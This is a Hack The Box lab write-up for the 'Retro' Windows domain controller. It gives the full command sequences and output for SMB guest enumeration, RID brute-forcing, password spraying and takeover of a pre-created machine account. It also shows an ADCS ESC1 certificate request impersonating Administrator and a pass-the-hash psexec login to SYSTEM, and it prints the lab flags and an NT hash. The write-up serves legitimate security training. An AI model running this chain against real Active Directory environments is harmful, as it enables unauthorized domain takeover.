---
title: 'Retro'
date: '2026-09-14'
excerpt: 'Easy - Windows'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Retro</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Retro is an Easy Windows machine that showcases an Active Directory Domain Controller. Through SMB enumeration and pre-created machine account exploitation, we gain access to the system. Through the exploitation of the Active Directory Certificate Service and specifically by using the ESC1 attack, which involves exploiting certificate templates to impersonate the Administrative user, privilege escalation is achieved.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the Fully Qualified Domain Name (FQDN) of the Domain Controller in Retro?</p>
<p class="mb-3"></p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.234.44 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-14 02:22 EDT
Nmap scan report for 10.129.234.44
Host is up (0.18s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-13 06:26:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-13T06:27:41+00:00; -23h56m04s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: 2026-09-13T06:27:42+00:00; -23h56m04s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-13T06:27:41+00:00; -23h56m04s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-13T06:27:42+00:00; -23h56m04s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-13T06:27:42+00:00; -23h56m04s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-13T06:27:00+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-09-12T06:25:10
|_Not valid after:  2027-03-14T06:25:10
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -23h56m04s, deviation: 0s, median: -23h56m04s
| smb2-time: 
|   date: 2026-09-13T06:27:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.85 seconds
```

<p class="mb-3">For the rest of the tasks, it is advisable to add the DNS entry to the <code>/etc/hosts</code> file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ echo "10.129.234.44 retro.vl dc.retro.vl" | sudo tee -a /etc/hosts
10.129.234.44 retro.vl dc.retro.vl
```

<p class="mb-5"><strong>Answer:</strong> DC.retro.vl</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is the non-default SMB share which is readable with the guest account?</p>
<p class="mb-3">Run <code>smbclient -L [TARGET_IP]</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ smbclient -L retro.vl
Password for [WORKGROUP\aaronamran]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Notes           Disk      
	SYSVOL          Disk      Logon server share 
	Trainees        Disk      
SMB1 disabled -- no workgroup available
```

<p class="mb-5"><strong>Answer:</strong> Trainees</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What is the account name that is referenced in Important.txt?</p>
<p class="mb-3">Running <code>smbclient //[TARGET_IP]/Trainees</code> shows a file named <code>Important.txt</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ smbclient //retro.vl/Trainees
Password for [WORKGROUP\aaronamran]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023

		4659711 blocks of size 4096. 1308143 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

<p class="mb-3">The note mentions that all trainee accounts are share among them and possibly have weak passwords. Using Netexec with guest authentication, we enumerate the RIDs of users and groups.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ nxc smb retro.vl -u "Guest" -p "" --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```

<p class="mb-3">Among the default objects, we observe 5 non-default accounts: <code>trainee</code>, <code>BANKING$</code>, <code>jburley</code>, <code>HelpDesk</code>, and <code>tblack</code>. Note that <code>BANKING$</code> is a machine account due to having a <code>$</code> character at the end. We add all the 5 accounts into a file called <code>user.txt</code>.</p>

```txt
trainee
BANKING$
jburley
HelpDesk
tblack
```

<p class="mb-5"><strong>Answer:</strong> trainee</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What is the trainee user's password?</p>
<p class="mb-3">Since there is a possibility of these accounts using weak passwords, we try first to check if any of the accounts are using their own username as the password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ nxc smb retro.vl -u users.txt -p users.txt --continue-on-success
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:trainee STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\jburley:trainee STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [+] retro.vl\HelpDesk:trainee (Guest)
SMB         10.129.234.44   445    DC               [-] retro.vl\tblack:trainee STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\jburley:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\tblack:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:jburley STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\tblack:jburley STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:HelpDesk STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\jburley:HelpDesk STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\tblack:HelpDesk STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:tblack STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\jburley:tblack STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE 
```

<p class="mb-3">A weak password for <code>trainee</code>s account is discovered. We now can enumerate the <code>Notes</code> share listed in the previous output of <code>smbclient</code>.</p>
<p class="mb-5"><strong>Answer:</strong> </p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What is the name of the share that the trainee account can access that guest could not?</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ smbclient //retro.vl/Notes -U 'trainee%trainee'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr  8 23:12:49 2025
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 18:05:56 2023
  user.txt                            A       32  Tue Apr  8 23:13:01 2025

		4659711 blocks of size 4096. 1326816 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ cat user.txt
cbda362cff2099072c5e96c51712ff33
```

<p class="mb-5"><strong>Answer:</strong> Notes</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Submit the flag located in the Notes SMB share.</p>
<p class="mb-5"><strong>Answer:</strong> cbda362cff2099072c5e96c51712ff33</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> What is the name of the old machine account that has pre-windows-2000 compatibility?</p>
<p class="mb-3">Reading <code>ToDO.txt</code> reveals that the old pre-created machine account from the finance department is the <code>BANKING$</code> account we found earlier from RID brute forcing.</p>
<p class="mb-5"><strong>Answer:</strong> BANKING$</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What is the error code returned when authenticating as the BANKING$ machine account with the default password?</p>
<p class="mb-3">So we verify if <code>banking</code> is the possible password for the <code>BANKING$</code> machine account.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ smbclient //retro.vl/Notes -U 'BANKING$%banking'
session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

<p class="mb-3">Since we get <code>NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> instead of a <code>NT_STATUS_LOGON_FAILURE</code> on the machine account, this looks to be the case.</p>
<p class="mb-5"><strong>Answer:</strong> NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> What is the name of the Certificate Authority (CA) Common Name (CN) that issue certificates in the Active Directory Certificate Services environment?</p>
<p class="mb-3">The password should be changed so we can authenticate successfully. If running <code>python3 changepasswd.py retro.vl/'banking$':banking@10.129.234.44 -newpass 'testpass123!' -p rpc-samr</code> returns errors, we first need to update Impacket installation either by running <code>python3 -m pip install --upgrade impacket
</code> or <code>sudo apt update && sudo apt install --only-upgrade python3-impacket</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ python3 changepasswd.py retro.vl/'banking$':banking@10.129.234.44 -newpass 'testpass123!' -p rpc-samr
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\banking$
[*] Connecting to DCE/RPC as retro.vl\banking$
[*] Password was changed successfully.
```

<p class="mb-3">Once we changed the password, we should attempt authentication with the new password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ crackmapexec smb retro.vl -u 'banking$' -p 'testpass123!'
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\banking$:testpass123! 
```

<p class="mb-3">Since we have the working credentials for the <code>banking$</code> account, we should also enumerate further. We check for presence of Active Directory Certificate Services.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ nxc ldap retro.vl -u 'banking$' -p 'testpass123!' -M adcs
LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.44   389    DC               [+] retro.vl\banking$:testpass123! 
ADCS        10.129.234.44   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.234.44   389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.129.234.44   389    DC               Found CN: retro-DC-CA
```

<p class="mb-3">We found that ADCS is installed and a Certificate Authority is identified as <code>retro-DC-CA</code>.</p>
<p class="mb-5"><strong>Answer:</strong> retro-DC-CA</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> Retro has an ADCS template that is vulnerable to a vulnerability which can be used to exploit Certificate enrollment by requesting certificates impersonating other users. What is the specific ESC pseudo name of this vulnerability?</p>
<p class="mb-3">We use Certipy to enumerate the Certificate Service.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ certipy-ad find -u 'banking$' -p 'testpass123!' -dc-ip 10.129.234.44 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

<p class="mb-3">Notice the output mentions the vulnerability ESC1, which allows an attacker to request a certificate for another user and use that to authenticate to the domain.</p>
<p class="mb-5"><strong>Answer:</strong> ESC1</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> Submit the flag located on the Administrator user's desktop.</p>
<p class="mb-3">We query the Domain Controller directly to hand us the SID before running our exploit.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ impacket-lookupsid RETRO.VL/banking$:'testpass123!'@10.129.234.44
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.234.44
[*] StringBinding ncacn_np:10.129.234.44[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

<p class="mb-3">The information required for the next step is CA Name, Template Name, Minimum RSA Key Length and SID. We run Certipy to request a new certificate from the RetroClients template to impersonate the Administrator user.</p>

```console
─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ certipy-ad req -u 'banking$' -p 'testpass123!' -dc-ip 10.129.234.44 -ca retro-DC-CA -template RetroClients -upn Administrator -debug -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.234.44'
[+] DC IP: '10.129.234.44'
[+] DC Host: None
[+] Target IP: None
[+] Remote Name: 'dc.retro.vl'
[+] Domain: ''
[+] Username: 'BANKING$'
[+] Trying to resolve 'dc.retro.vl' at '10.129.234.44'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[+] Found SID in SAN URL: 'S-1-5-21-2983547755-698260136-4283918172-500'
[+] Found SID in security extension: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

<p class="mb-3">When we want to use the certificate obtained to authenticate to the Domain Controller and retrieve the RC4 hash of the administrator user, we get a Kerberos Session Error. Running <code>sudo ntpdate [TARGET_IP]</code> should fix the issue.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ ls
administrator.pfx  changepasswd.py  Documents  Important.txt  my_data   Templates  users.txt  Videos
cacert.der         Desktop          Downloads  Music          Pictures  ToDo.txt   user.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ sudo ntpdate 10.129.234.44
2026-09-13 04:06:03.722367 (-0400) -86163.821202 +/- 0.088033 10.129.234.44 s1 no-leap
CLOCK: time stepped by -86163.821202
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

<p class="mb-3">Now we use Impacket PsExec to perform a Pass-the-Hash attack to authenticate as <code>Administrator</code> to the Domain Controller and obtain the root flag.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mtqax6k5mb]─[~]
└──╼ [★]$ impacket-psexec administrator@10.129.234.44 -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.234.44.....
[*] Found writable share ADMIN$
[*] Uploading file xgyEThpA.exe
[*] Opening SVCManager on 10.129.234.44.....
[*] Creating service kKHW on 10.129.234.44.....
[*] Starting service kKHW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 4BCB-B13C

 Directory of C:\Users\Administrator\Desktop

05/05/2025  04:55 AM    <DIR>          .
05/05/2025  03:51 AM    <DIR>          ..
04/08/2025  08:11 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   5,429,235,712 bytes free

C:\Users\Administrator\Desktop> more root.txt
40fce9c3f09024bcab29d377ee1ed071
```

<p class="mb-5"><strong>Answer:</strong> 40fce9c3f09024bcab29d377ee1ed071</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>